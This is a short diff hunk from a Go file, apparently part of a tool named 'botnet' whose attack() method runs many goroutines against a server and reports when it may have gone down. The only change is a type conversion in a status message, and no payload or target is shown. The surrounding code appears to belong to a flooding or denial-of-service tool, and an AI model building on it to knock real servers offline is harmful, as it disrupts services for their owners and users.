@@ -67,7 +67,7 @@ func (b botnet) attack() {
 					fmt.Println("ERROR:", err.Error())
 					fmt.Println("Perhaps the server went down!")
 				}
-				c <- "END ROUTINE " + strconv.Itoa(idx)
+				c <- "END ROUTINE " + strconv.Itoa(int(idx))
 			}(b.channel, i)
 		}
 		for i := b.maxRoutines; i > 0; i-- {
